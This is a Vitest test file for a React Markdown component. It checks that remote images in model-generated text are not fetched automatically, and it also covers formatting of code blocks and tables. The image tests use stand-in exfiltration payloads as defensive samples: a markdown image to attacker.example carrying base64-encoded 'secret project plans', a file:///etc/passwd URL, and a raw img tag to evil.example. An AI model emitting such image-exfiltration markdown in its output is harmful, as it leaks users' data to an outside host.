// Markdown from models and feeds must not fetch remote images on its own (finding foundation-1).
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown, RemoteImageView } from '@renderer/components/Markdown';

const render = (md: string) => renderToStaticMarkup(<Markdown>{md}</Markdown>);

describe('Markdown images', () => {
  it('does not load a remote image from model text; shows a click-to-load placeholder naming the host', () => {
    const html = render('Summary done.\n\n![](https://attacker.example/p.png?d=c2VjcmV0IHByb2plY3QgcGxhbnM%3D)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('src="https://attacker.example');
    expect(html).toContain('attacker.example');
    expect(html).toContain('click to load');
    expect(html).toContain('<button type="button"');
  });

  it('keeps the alt text in the placeholder', () => {
    const html = render('![GPU chart](https://cdn.example.org/chart.png)');
    expect(html).not.toContain('<img');
    expect(html).toContain('GPU chart');
    expect(html).toContain('cdn.example.org');
  });

  it('renders non-https and credentialed image URLs as their alt text only', () => {
    for (const src of ['file:///etc/passwd', 'http://plain.example/x.png', 'https://user:pw@host.example/x.png']) {
      const html = render(`![alt-${src.length}](${src})`);
      expect(html, src).not.toContain('<img');
      expect(html, src).not.toContain('<button');
      expect(html, src).toContain(`alt-${src.length}`);
    }
  });

  it('loads the image only once clicked, without a Referer', () => {
    const idle = renderToStaticMarkup(<RemoteImageView src="https://cdn.example.org/a.png" alt="a" loaded={false} onLoad={() => undefined} />);
    expect(idle).not.toContain('<img');
    const loaded = renderToStaticMarkup(<RemoteImageView src="https://cdn.example.org/a.png" alt="a" loaded onLoad={() => undefined} />);
    expect(loaded).toContain('<img src="https://cdn.example.org/a.png"');
    expect(loaded).toContain('referrerPolicy="no-referrer"');
  });

  it('still renders links, code and tables (raw HTML is skipped)', () => {
    const html = render('[docs](https://docs.gmicloud.ai) `x` <img src="https://evil.example/raw.png">\n\n| a |\n|---|\n| b |');
    expect(html).toContain('href="https://docs.gmicloud.ai"');
    expect(html).toContain('<code>x</code>');
    expect(html).toContain('<table>');
    expect(html).not.toContain('evil.example');
  });
});

describe('Markdown code blocks and tables', () => {
  it('labels fenced code with its language and offers a copy button', () => {
    const html = render('```sql\nSELECT 1;\n```');
    expect(html).toMatch(/<span[^>]*>sql<\/span>/);
    expect(html).toContain('aria-label="Copy code"');
    expect(html).toContain('<code class="language-sql">SELECT 1;\n</code>');
  });

  it('falls back to a generic label when the fence names no language', () => {
    const html = render('```\nplain\n```');
    expect(html).toMatch(/<span[^>]*>code<\/span>/);
    expect(html).toContain('aria-label="Copy code"');
  });

  it('keeps inline code plain (no copy button)', () => {
    const html = render('Use `x` here');
    expect(html).toContain('<code>x</code>');
    expect(html).not.toContain('Copy code');
  });

  it('frames tables in a sideways-scrolling container', () => {
    const html = render('| a | b |\n|---|--:|\n| 1 | 2 |');
    expect(html).toMatch(/<div class="[^"]*overflow-x-auto[^"]*"><table>/);
    expect(html).toContain('text-align:right');
  });

  it('leaves table cells to .gmi-markdown (no !important overrides on th/td)', () => {
    const html = render('| a | b |\n|---|--:|\n| 1 | 2 |');
    expect(html).toContain('<th>a</th>');
    expect(html).toContain('<td>1</td>');
    expect(html).not.toMatch(/<t[hd][^>]*class=/);
  });

  it('never leaks the parsed node into DOM attributes', () => {
    const html = render('[docs](https://docs.gmicloud.ai)\n\n| a |\n|---|\n| b |\n\n```js\n1\n```');
    expect(html).not.toContain('node=');
    expect(html).not.toContain('[object Object]');
  });
});
